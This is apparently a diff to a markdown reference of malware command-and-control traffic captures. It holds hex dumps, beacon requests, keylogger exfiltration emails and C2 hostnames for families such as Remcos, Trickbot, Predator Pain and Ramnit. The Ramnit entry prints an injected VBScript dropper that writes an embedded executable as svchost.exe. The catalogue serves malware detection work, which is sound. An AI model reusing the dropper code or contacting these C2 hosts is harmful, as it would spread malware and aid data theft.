+Content-Length: 199
+Connection: close
+Content-Type: application/octet-stream
+Content-Encoding: binary
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)
+
+HTTP/1.1 200 OK
+Date: Wed, 09 Oct 2019 08:44:06 GMT
+Server: Apache
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+STATUS-IMPORT-OK
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pony-loader.png "Pony Loader")
+
+#### Predator Pain Keylogger
+~~~
+From: pain@globalfinancel.com
+To: pain@globalfinancel.com
+Date: 17 Oct 2019 08:04:48 -0700
+Subject: Predator Pain v13 - Server Ran - [XRWJAM272278424]
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: quoted-printable
+
+This is an email notifying you that XRWJAM272278424 has ran your =
+logger and emails should be sent to you shortly and at interval c=
+hoosen.=0D=0A =0D=0APredator Logger Details: =0D=0AServer Name: R=
+egSvcs.exe=0D=0AKeylogger Enabled: False=0D=0AClipboard-Logger En=
+abled: False=0D=0ATime Logs will be delivered: Every 60 minutes=0D=0A=
+ =0D=0AStealers Enabled: True=0D=0ATime Log will be delivered: Av=
+erage 2 to 4 minutes=0D=0A =0D=0ALocal Date and Time: 10/17/2019 =
+8:04:41 AM=0D=0AInstalled Language: en-US=0D=0AOperating System: =
+Microsoft Windows 7 Professional =0D=0AInternal IP Address: 192.1=
+68.180.170=0D=0AExternal IP Address: =0D=0AInstalled Anti-Virus: =
+=0D=0AInstalled Firewall:=20
+
+.
+250 OK id=1iL7Kv-003iIX-Hl
+
+From: pain@globalfinancel.com
+To: pain@globalfinancel.com
+Date: 17 Oct 2019 08:05:04 -0700
+Subject: Predator Pain v13|Stealer Log - [XRWJAM272278424]
+Content-Type: text/plain; charset=us-ascii
+Content-Transfer-Encoding: quoted-printable
+
+                                 ********************************=
+**************=0D=0A                                      Operati=
+ng System Intel Recovery=0D=0A                                 **=
+********************************************=0D=0ACPU Name: XRWJA=
+M272278424=0D=0ALocal Date and Time: 10/17/2019 8:04:55 AM=0D=0AI=
+nstalled Language: en-US=0D=0ANet Version: 4.0.30319.42000=0D=0AO=
+perating System Platform: Win32NT=0D=0AOperating System Version: =
+6.1.7601.65536=0D=0AOperating System: Microsoft Windows 7 Profess=
+ional =0D=0AInternal IP Address: 192.168.180.170=0D=0AExternal IP=
+ Address: =0D=0AInstalled Anti-Virus: =0D=0AInstalled Firewall: =0D=0A=
+                                 ********************************=
+**************=0D=0A                                      WEB Bro=
+wser Password Recovery=0D=0A                                 ****=
+******************************************=0D=0A=0D=0A           =
+                      *******************************************=
+***=0D=0A                                    Mail Messenger Passw=
+ord Recovery=0D=0A                                 **************=
+********************************=0D=0A=0D=0A                     =
+            **********************************************=0D=0A =
+                                   Internet Download Manager Reco=
+very=0D=0A                                 **********************=
+************************=0D=0A                                 **=
+********************************************=0D=0A               =
+                       Jdownloader Password Recovery=0D=0A       =
+                          ***************************************=
+*******
+
+.
+250 OK id=1iL7LE-003ina-5V
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predatorpain.png "Predator Pain Keylogger")
 
 #### Predator the Thief
 ~~~
@@ -795,6 +1285,24 @@ f...Y.[.V.......G.*"...Ig..Y...k=}..}..U....@....T..n.-)7Z.Yt..%...$.P.vQ....p.z
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/predator.png "Predator")
 
+#### Pyrogenic
+flah on "53 E1 6D D3 9E EE 45 D4" on iniial connection, 175 bytes
+~~~
+00000000  53                                                 S
+00000001  e1 6d d3 9e ee 45 d4 ad  26 96 67 86 36 fb f7 cc   .m...E.. &.g.6...
+00000011  3f 15 13 b7 cf 5e 99 ac  dc 9d e6 36 cd 61 bd 91   ?....^.. ...6.a..
+00000021  37 5c db a0 15 ec f4 5a  9a 63 96 7f 2b e6 b3 3c   7\.....Z .c..+..<
+00000031  96 a9 aa fe d6 37 6d f5  1d 57 8f 26 f1 03 a4 7a   .....7m. .W.&...z
+00000041  7b d9 5f 01 8c 5e 87 c5  de 80 a2 52 15 24 e0 73   {._..^.. ...R.$.s
+00000051  51 70 b4 6f 60 7c a8 4c  df 36 ac df 96 b3 18 b5   Qp.o`|.L .6......
+00000061  54 37 74 9b d1 60 06 f1  46 b2 8f e2 23 f2 58 80   T7t..`.. F...#.X.
+00000071  de d9 8d d9 10 35 91 7f  d9 74 4b 6e 05 4c 13 9f   .....5.. .tKn.L..
+00000081  68 85 65 d0 bb f6 67 0c  78 ae 12 b6 ab 89 90 14   h.e...g. x.......
+00000091  e0 47 c5 56 c9 e0 0f 17  73 95 ee 30 08 fa 0e 47   .G.V.... s..0...G
+000000A1  cd ec dd 72 db e7 ff bf  b9 57 b3 61 c4 cb 4c      ...r.... .W.a..L
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/pyrogenic.png "Pyrogenic")
+
 #### Qbot
 usually url is /t3
 ~~~
@@ -826,6 +1334,16 @@ Flag on "40 00 00 00" pattern, 68 data bytes on first packet
 00000040  c6 b3 03 8c                                        ....
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/quasar.png "Quasar")
+
+#### RaaLoader aka Pefsire
+~~~
+00000000  12 10 00 00 00 00 00 00  00 00 00 00               ........ ....
+    00000000  00 00 00 00 06                                     .....
+0000000C  00 00 00 00 06                                     .....
+    00000005  00 00 00 00 06                                     .....
+00000011  00 00 00 00 06                                     .....
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raaloader.png "RaaLoader")
 
 #### Raccoon Stealer
 ~~~
@@ -899,11 +1417,87 @@ true"success"
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-1.png "Predator")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/raccoon-2.png "Predator")
 
+#### Remcos RAT
+~~~
+[DataStart]x...K...SMILING BASES|cmd|M.K.Z.T.2.4.4.6.8.5.8.7.4.7.4./.h.g.M.y.Z.r.4.1.u.S.U.1.F.|cmd|US|cmd|Microsoft Windows XP (32 bit)|cmd||cmd|2095747072|cmd|2.5.0 Pro|cmd|C.:.\.D.o.c.u.m.e.n.t.s. .a.n.d. .S.e.t.t.i.n.g.s.\.A.d.m.i.n.i.s.t.r.a.t.o.r.\.A.p.p.l.i.c.a.t.i.o.n. .D.a.t.a.\.y.e.d.c.o.s.\.l.o.g.s...d.a.t.|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd||cmd||cmd|1|cmd|0|cmd|9562396|cmd|1|cmd|hangulcoxpw.pw|cmd|uCjp95GKXiHwd-AJJHX8|cmd|0|cmd|C.:.\.D.O.C.U.M.E.~.1.\.A.D.M.I.N.I.~.1.\.L.O.C.A.L.S.~.1.\.T.e.m.p.\.R.e.g.S.v.c.s...e.x.e.|cmd|Intel(R) Core(TM) i7-4770 CPU @ 3.40GHz
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/remcos.png "Remcos")
+
+#### Ramnit
+~~~
+GET / HTTP/1.1
+Host: www.yx-lj.com
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+HTTP/1.1 200 OK
+Content-Length: 114482
+Content-Type: text/html
+Content-Location: http://www.yx-lj.com/index.htm
+Last-Modified: Tue, 21 May 2019 01:43:35 GMT
+Accept-Ranges: bytes
+ETag: "47c7bf9a76fd51:ac9"
+Server: Microsoft-IIS/6.0
+MicrosoftOfficeWebServer: 5.0_Pub
+X-Powered-By: ASP.NET
+Date: Thu, 17 Oct 2019 18:56:31 GMT
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>..........</title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<meta name="Keywords" content="........,................,........" />
+<meta name="Description" content="...................................................." />
+<link href="images/style.css" rel="stylesheet" type="text/css">
+<style type="text/css">
+<!--
+body {
+	margin-left: 0px;
+	margin-top: 0px;
+	margin-right: 0px;
+	margin-bottom: 0px;
+	background-color: #000000;
+}
+-->
+</style>
+</head>
+
+<body>
+
+
+
+<title>..........</title>
+<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
+  <tr>
+    <td align="center" valign="middle" bgcolor="#000000"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="990" height="677">
+      <param name="movie" value="china/images/index.swf" />
+      <param name="quality" value="high" />
+      <param name="BGCOLOR" value="#000000" />
+      <embed src="china/images/index.swf" width="990" height="677" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" bgcolor="#000000"></embed>
+    </object></td>
+  </tr>
+</table>
+</body>
+</html>
+ 
+
+ 
+ 
+<SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+WriteData = "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ramnit.png "Ramnit")
+
 #### Revenge RAT
 ~~~
 InformationRevenge-RATUEVSRElSRevenge-RATX0M0QkEzNjQ3Revenge-RAT192.168.100.213Revenge-RATVVNFUi1QQyAvIGFkbWluRevenge-RATNoRevenge-RATTWljcm9zb2Z0IFdpbmRvd3MgNyBQcm9mZXNzaW9uYWwgIDMyRevenge-RATSW50ZWwoUikgQ29yZShUTSkgaTUtNjQwMCBDUFUgQCAyLjcwR0h6Revenge-RAT3757686784Revenge-RATTi9BRevenge-RATTi9BRevenge-RAT1000Revenge-RATTWljcm9zb2Z0IFBvd2VyUG9pbnQ=Revenge-RATZW4tVVM=Revenge-RATFalse*-]NK[-*
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/revenge.png "Rvenge RAT")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/revenge.png "Revenge RAT")
 
 #### RMS RAT
 ~~~
@@ -911,6 +1505,27 @@ InformationRevenge-RATUEVSRElSRevenge-RATX0M0QkEzNjQ3Revenge-RAT192.168.100.213R
 <rman_message version="67002"><code>1</code><string_param></string_param><string_param_2></string_param_2><int_param>1</int_param><data>77u/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxyb21fdmVyc2lvbiB2ZXJzaW9uPSI2NzAwMiI+PHByb2R1Y3Q+Uk1TPC9wcm9kdWN0Pjx2ZXJzaW9uPjY3MDAyPC92ZXJzaW9uPjx0ZXh0X3ZlcnNpb24+Ni43LjAuMjwvdGV4dF92ZXJzaW9uPjxiZXRhX3ZlcnNpb24+MDwvYmV0YV92ZXJzaW9uPjxwcm90b2NvbF92ZXJzaW9uPjU8L3Byb3RvY29sX3ZlcnNpb24+PGtpbmQ+MTwva2luZD48aWQ+NDAwLTYyMi05OTItNzg5PC9pZD48ZGV2aWNlX25hbWU+VXNlci1QQzwvZGV2aWNlX25hbWU+PGNvdW50cnlfY29kZT4yNDQ8L2NvdW50cnlfY29kZT48dXNlcl9kYXRhPjNGNEY1QTZDQjk1MDQ3RkVBNjEwMkJEN0QyMjI2QUE5PC91c2VyX2RhdGE+PHN5c3RlbV9oYXNoPjA4Q0FDN0UyNTQ0MTMzRjNBODIzMEZENUY5MzM0QkMzMUFEQTY5NkVFNUYzMzczQjVEODUzMzZCNTcxRDRFRkQ5MEVGQjU5NzJFRUNFMzg3N0M3QUNENDUyODBGRUJCQTJCMjMzMDZCOENDRkYwRDhDNUUyOTJCQ0M3OEY2MjAzPC9zeXN0ZW1faGFzaD48c3luY19kYXRhPkM4Q0VBOEJBRDQxODFBMjFBNDU4QzVGNkU1MTIwN0Y0PC9zeW5jX2RhdGE+PHJhdGlvPjA8L3JhdGlvPjx0cmlhbF9zdGF0ZT4wPC90cmlhbF9zdGF0ZT48YnBoX3ZlcnNpb24+ZmFsc2U8L2JwaF92ZXJzaW9uPjxsaWNlbnNlX2tleT48L2xpY2Vuc2Vfa2V5PjxkYXlzX2xlZnQ+MDwvZGF5c19sZWZ0Pjwvcm9tX3ZlcnNpb24+DQo=</data></rman_message>
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/rms.png "RMS RAT")
+
+#### Sarwent BOT"
+~~~
+GET /gate/connect?os=Windows+7+Release+Preview+(Build%3A+7601+-+Service+Pack%3A+1.0)+&bits=x64&av=Not+found HTTP/1.1
+Host: shopstoregame.icu
+Connection: keep-alive
+User-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14
+Accept: */*
+
+HTTP/1.1 200 OK
+Date: Mon, 14 Oct 2019 11:02:40 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Cache-Control: no-cache, private
+Set-Cookie: XSRF-TOKEN=eyJpdiI6IjNkQ2hqY01YSVJtRUlBM1REeCtxRkE9PSIsInZhbHVlIjoiV1Y2dkxHMjRYWm5TemxGOFNUWHlKU0hZTWNJKyszaVh3SVEzb3pWcEFBeUhFOU9UQms3a3ZKMUo3U1NLNzE0dCIsIm1hYyI6IjZlMWEwMTM2YjE0NDcxMzJkYjY1MmE2NmQxZjU0YzJjYjAwODU0MWI0YTRhMTUyNzQxOTg2MjYwNjQyMjAyOWIifQ%3D%3D; expires=Mon, 14-Oct-2019 13:02:40 GMT; Max-Age=7200; path=/
+Set-Cookie: laravel_session=eyJpdiI6Ijd5dUpwTE5yMmFWeUFPVmZTUlA3bnc9PSIsInZhbHVlIjoiTlpNajV5eDVFWlVzUDdjMFwvdFlTYm41UVNFVW5JdVJuZzdvN0ZFcWNaWFRlOXcwUWRVSUdwQm0wK1VFSmRBQkoiLCJtYWMiOiJlNjg1OGMzNWQ5ZDI2NjU2ZmU0MzBiNjNkN2Y3MDAwZDhhZThkMTllNWQ2MTRlYWM5YzI3MGI0MzllYzg2MDI4In0%3D; expires=Mon, 14-Oct-2019 13:02:40 GMT; Max-Age=7200; path=/; httponly
+Content-Length: 0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/sarwent.png "Sarwent BOT")
 
 #### Servhelper
 ~~~
@@ -945,22 +1560,46 @@ Host: thankg1.org
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/smokeloader.png "Smokeloader")
 
-#### TA505 Loader:
+#### Trickbot
 ~~~
-POST /2021 HTTP/1.1
-Connection: Keep-Alive
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.2; CIBA; MS-RTC LM 8)
-Content-Length: 95
-Host: windows-sys-update.com
+GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/5/spk/
+      << 200 OK 224b
+GET http://54.225.92.64/
+      << 200 OK 12b
+GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/0/Windows%207%20x64%20SP1/1075/167.88.7.134/77CAB0693C33C9DA65ECB06B990E1B2A0B60E199332E20B769B1041E6155930A/7FPzmRZqhwAAJvgTcFSqNLk/
+      << 200 OK 937b
+GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/user/SYSTEM/0/
+      << 200 OK
+GET https://190.154.203.218:449/trg448/JONATHAN-PC_W617601.F330EDDF8E877AF892B08D9522EAD4C6/14/path/C:%5CUsers%5CJonathan%5CAppData%5CRoaming%5CnetRest%5C%E4%BB%BB%E3%81%AF%E3%82%A7%E7%A7%81%E3%81%8D%E7%A7%81%E6%8A%B1%E3%81%9F%E3%82%82%E3%81%A1%E6%84%9B.exe/0/
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/trickbot.png "Trickbot")
 
-&D=User-PC&U=admin&OS=6.1&PR=Dwm.exe%7CEXCEL.EXE%7CExplorer.EXE%7Ctaskhost.exe%7Cwindanr.exe%7CHTTP/1.1 404 Not Found
-Server: nginx/1.10.3
-Date: Wed, 09 Oct 2019 18:53:18 GMT
-Content-Length: 0
-Connection: keep-alive
+#### Ursa Loader
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ta505-loader.png "TA505 Loader")
+POST /nj41.php HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
+Host: 18.217.112.176
+Content-Length: 3
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+q=1HTTP/1.1 200 OK
+Date: Fri, 19 Jul 2019 15:17:26 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 5840
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+FHTHSEPHJHWHWHTHWEPHWHJHXIAHRHJEPHSHJIDHYDVDSDVDSDVDSDVDSHHHTHSHXHYEPEPHHGAGMGBEPEPEPFTEPFNFODVDSHHHTHSHXHYEPEPHHGGGBEPEPFTEPERFHERDVDSHHHTHSHXHYEPEPHXGPHTHQHJGVEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFHPHXFJHFERDVDSHHHTHSHXHYEPEPHXGPHTHQHJGVGUFIEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFHRFFHPHXFJERDVDSHHHTHSHXHYEPEPICHQHNHSHPGDEPEPFTEPERHMHYHYHUFQFFFFFHFOFEFIFHFNFEFHFHFIFEFHFNFMFFERDVDSHHHTHSHXHYEPEPHHGPHFHNIFFHEPFTEPERGAFQHAGSHXHJHWHXHAGNIAHGHQHNHHHAERDVDSHHHTHSHXHYEPEPHHGVGFEPFTEPERFEHSHOFKERDVDSHHHTHSHXHYEPEPHHGVGXEPFTEPERFEIFHNHUERDVDSHHHTHSHXHYEPEPHHGUIAHXFJHWEPFTEPERHPHXFJERDVDSHHHTHSHXHYEPEPHHGQHJHSGJHTHFHIEPFTEPERHUHYHTHRIDERDVDSHHHTHSHXHYEPEPHHGAHMHNHQHJHGHJHFHSHXEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSFXHUHUEPFTEPERFHERDVDSHHHTHSHXHYEPEPICGTHJHWHXHNHTHSFX
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/ursa.png "Ursa Loader")
 
 #### Ursnif:
 ~~~
@@ -1065,19 +1704,63 @@ M....u..f..<..^..ek/.[...2...P=...3....>.................9J.V&.6..<....f.}......
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-1.png "Vidar")
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vidar-2.png "Vidar")
 
+#### Vjworm vjw0rm
+~~~
+POST /Vre HTTP/1.1
+Accept: */*
+Accept-Language: en-us
+User-Agent: Laposte_C4BA3647\PC\admin\Microsoft Windows 7 Professional \Not-found\\Yes\FALSE\
+Accept-Encoding: gzip, deflate
+Host: jihanenouhaila.ddns.net:7773
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/vjworm.png "VJworm")
+
 ### Unknowns
 #################################################################################################
-
-#### Unknownmalware4
-h/t @thlnk3r, hash 0f220c1bd968fe68b729ae3a39f00958bae021169fa9afb0d659beb14f19f7a5
+#### Unknownbotnet4
+hashes:
 ~~~
-POST /jab2/s.php HTTP/1.1
+e3fd7b57bb830fb083759e2d53dce0b6964985dc65d60b040c956b47f64409df
+9201efca328fa5b800a314506d8dddb47ab15e6f47af51331bd0f0e8dff3b70b
+ba59f46f684b3602258ce5433c7abbdc016ed4ee1aa2bc8d94520584da63bbc4
+3a3da758f7a96401fc3b5ad6392c9286f27fb165054b0dab30257bf28dca6be2
+839d301c9ffaf561affa77a913f6bc76498f9df31028a34b967f170fe3e600a5
+30d83178f17b86306edd85432b8092ec7b5359aa65245326399f13be43e09553
+a64f6c8a28083f8c3701b8377253ba288543a1f0eeb110725e8241fad32db168
+8647bcef74d55423bcf1877097a0c732869e29548f74933b1f0a15fce44120ac
+32cb69f85ac78e8183be54e8fbc9576a0aa36491e3782f01f59fe57bf4d9fe7a
+~~~
+~~~
+POST /gate.php HTTP/1.1
 Connection: Keep-Alive
-Content-Type: application/x-www-form-urlencoded; charset=utf-8
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
-Content-Length: 372
-Host: dsfhhhhf44555.icu
+Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
+Accept: */*
+User-Agent: 94af05617f4e0479d766f422f611ad5c
+Content-Length: 465
+Host: smartwaay.xyz:9998
 
-key=%15%08%00%15%07%12%14%12%02%12%12&sysid=%09%02%07D96%1A%1D%02%0E%04%00FVS+%03%13%05%1A%05%04S%23%07%02%18SWA%5B%25%03%13%00%1A%09%0FSEHP_S%24%14%1A%1F%02ADEVP_SPU%5E%11%0F%15S6%02%08%07%1A%09%0FZ%2C%1EWG%2C94+64L%230BZ%12%17%0B%08%1D%2C%11%08%1D%12%05%02I%00%13%11%03%1C%14%15%12%10%05%0E%06%1D%12Z%1F%3B%1E%24B1%0B%07H%2CSTEJU&resp=%09%0A&rights=%00%07%15%15%00&misc=
+rk=1&aw=%5B%22v1%2E0%2E3705%22%2C%22v1%2E1%2E4322%22%2C%22v2%2E0%2E50727%22%2C%22v3%2E0%22%2C%22v3%2E5%22%2C%22v4%2E0%2E30319%22%5D&ys=C%3A%5CProgram+Files%5CMozilla+Firefox%5Cfirefox%2Eexe&it=1&dw=%5B%22Steven%22%5D&rt=1%2E1%2E0&yj=1&sk=8272244&vt=Intel%28R%29+Core%28TM%29+i7%2D3740QM+CPU+%40+2%2E70GHz&tf=%5B%226%22%2C%221%22%2C%227601%22%2C%22Service+Pack+1%22%2C%22256%22%2C%221%22%2C%220%22%5D&he=0&zo=39874b0c4717a111115c96bcb65bcbdd&fj=&bf=STEVEN%2DACCOUNTI
+
+POST /gate.php HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded; Charset=UTF-8
+Accept: */*
+User-Agent: 94af05617f4e0479d766f422f611ad5c
+Content-Length: 462
+Host: nicholaspring.xyz:9998
+
+vt=Intel%28R%29+Xeon%28R%29+CPU+E5%2D2630+v4+%40+2%2E20GHz&rk=1&dw=%5B%22HAPUBWS%22%5D&he=0&fj=&aw=%5B%22v1%2E0%2E3705%22%2C%22v1%2E1%2E4322%22%2C%22v2%2E0%2E50727%22%2C%22v3%2E0%22%2C%22v3%2E5%22%2C%22v4%2E0%2E30319%22%5D&zo=ddcf33e1f0649076576a7aaee8f83b66&tf=%5B%226%22%2C%221%22%2C%227601%22%2C%22Service+Pack+1%22%2C%22256%22%2C%221%22%2C%220%22%5D&it=0&rt=1%2E1%2E0&yj=1&bf=2TWgVlMc0b&sk=3144704&ys=C%3A%5CProgram+Files%5CInternet+Explorer%5Ciexplore%2EexeHTTP/1.1 200 OK
+Date: Thu, 04 Apr 2019 14:57:08 GMT
+Server: Apache/2.4.34 (Unix)
+X-Powered-By: PHP/7.3.0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+2
 ~~~
-![alt text](https://github.com/silence-is-best/c2db/blob/master/images/unknownmalware4.png "Unknownmalware4")
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/unknownbotnet4.png "Unknownbotnet4")
